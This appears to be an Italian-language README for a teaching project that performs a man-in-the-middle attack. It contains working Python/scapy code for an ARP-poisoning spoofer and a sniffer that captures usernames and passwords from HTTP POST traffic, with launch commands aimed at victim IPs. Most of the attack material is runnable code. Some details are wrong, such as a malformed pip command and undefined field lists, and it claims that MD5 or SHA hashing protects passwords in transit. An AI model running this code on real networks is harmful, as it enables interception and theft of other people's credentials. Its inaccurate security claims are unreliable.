# MITM
MITM con password sniffer
## Premessa
Questo codice è stato sviluppato per il solo scopo didattico. Si declina ogni responsabilità per un eventuale uso improprio.
## Funzionamento:
Il funzionamento si basa sul [Man-In-The-Middle](https://it.wikipedia.org/wiki/Attacco_man_in_the_middle) che viene effettuato tramite un attacco di tipo [ARP spoofer](https://it.wikipedia.org/wiki/ARP_poisoning) grazie al quale è possibile identificarsi su una rete con l'indirizzo [MAC](https://it.wikipedia.org/wiki/Indirizzo_MAC) di un altra macchina.
### Frame ARP
Il frame ARP è composto da diverse parti, alcune di esse sono:
* *op*: indica l'operazione che svolge il frame differenziando tra:
  * 1 = who-has, indica un ARP Request
  * 2 = is-at, indica un ARP Reply
* *hwdst*: contiene l'indirizzo MAC di destinazione
* *pdst*: contiene l'indirizzo IP di destinazione
* *hwsrc*: contiene l'indirizzo MAC sorgente
* *psrc*: contiene l'indirizzo IP sorgente
## Preparazione
### Librerie
Per poter avviare il codice bisogna installare le seguenti librerie:
* scapy
* sys
* time
* os
* re
* urllib

Si possono installare col seguente comando:
```bash
pip install scapy, sys, time, os, re, urllib
```
### Nmap
Se c'è bisogno di ottenere gli indirizzi IP delle vittime si può scansionare la rete con [nmap](https://nmap.org/) usando il seguente comando e sostituendo networkIP con l'indirizzo di rete e CIDR con il CIDR della rete:
```bash
nmap -O networkIP/CIDR
```

Esempio:
```bash
nmap -O 192.168.0.0/24
```

### Interfaccia di rete
Per un corretto funzionamento inserire la propria interfaccia di rete nel file sniffer.py alla riga 50 al posto di eth0:
```python
iface = "eth0"
```
## Avvio
Per avviare l'attacco bisogna aprire due terminali nella cartella in cui si trovano i due file.
Nel primo bisogna eseguire il seguente comando sostituendo i due indirizzi con quelli delle vittime:
```bash
python3 ARPspoofer.py indirizzoIP1 indirizzoIP2
```

Esempio:
```bash
python3 ARPspoofer.py 192.168.0.1 192.164.0.234
```

Nel secondo basta eseguire il comando:
```bash
python3 sniffer.py
```

# Codice
Di verranno seguito spiegati i codici dell'ARP spoofer e del Password sniffer.
## ARP spoofer
Spiegazione del codice contenuto in *ARPspoofer.py*.
### Import
```python
import scapy.all as scapy
import sys, time, os
from scapy.layers.l2 import ARP, Ether
```

Per ottenere gli IP inseriti in riga di comando:
```python
target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])
```

Loop:
```python
try:
    #Abilita l'IP Forwarding
    os.system("echo 1 >> /proc/sys/net/ipv4/ip_forward")
    while True:
        spoof(router_ip, target_ip, router_mac, target_mac)
        time.sleep(2)

#Interrompe il loop tramite tastiera
except KeyboardInterrupt:
    #Disabilita l'IP Forwarding
    os.system("echo 0 >> /proc/sys/net/ipv4/ip_forward")
    print('Closing ARP Spoofer')
    exit(0)
```
### Funzioni
La funzione _get\_mac\_address(ip)_ ottiene l'indirizzo MAC collegato all'indirizzo IP inserito utilizzando delle ARP Request generate con scapy:
```python
#Ottiene l'indirizzo MAC
def get_mac_address(ip):

    #Crea il layer Ethernet con destinazione l'indirizzo di broadcast
    broadcast_layer = Ether(dst='ff:ff:ff:ff:ff:ff')

    #Crea il layer ARP con IP di destinazione uguale all'IP inserito
    arp_layer = ARP(pdst=ip)

    #Incapsula il layer ARP nel layer Ethernet e crea il pacchetto
    get_mac_packet = broadcast_layer/arp_layer

    #Genera l'ARP Request e riceve l'ARP Reply 
    answer = scapy.srp(get_mac_packet, timeout=2, verbose=False)[0]

    #Torna l'indirizzo MAC ricevuto
    return answer[0][1].hwsrc
```
La funzione _spoof(router_ip, target_ip, router_mac, target_mac)_ genera e invia i frame ARP "avvelenati" alle vittime con scapy:
```python
#Invia i frame avvelenati alle vittime
def spoof(router_ip, target_ip, router_mac, target_mac):

    #Crea un frame con destinatario la vittima1 fingendosi la vittima2 
    packet1 = ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)

    #Crea un frame con destinatario la vittima1 fingendosi la vittima2
    packet2 = ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)

    #Invia i pacchetti
    scapy.send(packet1)
    scapy.send(packet2)
```
## Password sniffer
Spiegazione del codice contenuto in *sniffer.py*.
### Import
```python
from scapy.all import *
from urllib import parse
import re
from scapy.layers import http
```

Loop:
```python
# Interfaccia di rete
iface = "eth0"

try:
    sniff(iface=iface,     # Specifica l'interfaccia di rete
          prn=pkt_parser,  # Specifica il pacchetto da analizzare
          store=0)

# Interrompre il loop tramite tastiera
except KeyboardInterrupt:
    print('Exiting Sniffer')
    exit(0)
```

### Funzioni
La funzione _pkt\_parser(packet)_ analizza il pacchetto inserito e ritorna username e password se ne trova:
```python
# Analizzatore di pacchetti
def pkt_parser(packet):
    # Controlla la presenza di layer HTTPRequest e se ottenuti con POST
    if packet.haslayer(http.HTTPRequest) and packet[http.HTTPRequest].Method == b'POST':

        # Ottiene i dati contenuti del pacchetto
        raw_fields = packet[http.HTTPRequest].getlayer('Raw').fields
        body = str(raw_fields['load'])

        #Cerca username e password allinterno dei dati
        user_pass = get_login_pass(body)

        # Controlla se lo sniffer ha ottenuto un'username e una password
        if user_pass != None:
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
        pass
```

La funzione _get\_login\_pass(body)_ cerca username e password confrontando i campi contenuti nelle liste _userfields_ e _passwordfields_ con quelli contenuti nei dati del pacchetto in analisi:
```python
def get_login_pass(body):
    user = None
    passwd = None

    # Compara i campi contenuti nelle liste con quelli dei dati nel pacchetto in analisi
    for login in userfields:
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfd in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfd, body, re.IGNORECASE)
        if pass_re:
            passwd = pass_re.group().rstrip('\'')

    # Se ottiene username e password li ritorna
    if user and passwd:
        return (user, passwd)
```

# Vulnerabilità
Il programma sfrutta prima di tutto la bassa sicurezza del protocollo ARP che è facilmente infettabile da un criminale per eseguire MITM, ARP poisoning e altri attacchi. Per quanto riguarda lo sniffer, questo sfrutta la mancanza di sicurezza nei siti internet sprovvisti di [HTTPS](https://it.wikipedia.org/wiki/HTTPS) o che inviano le password e gli username degli utenti “in chiaro”, ossia senza sistemi di crittografia come [MD5](https://it.wikipedia.org/wiki/MD5) o [SHA](https://it.wikipedia.org/wiki/Secure_Hash_Algorithm), tramite [PHP](https://www.php.net/).
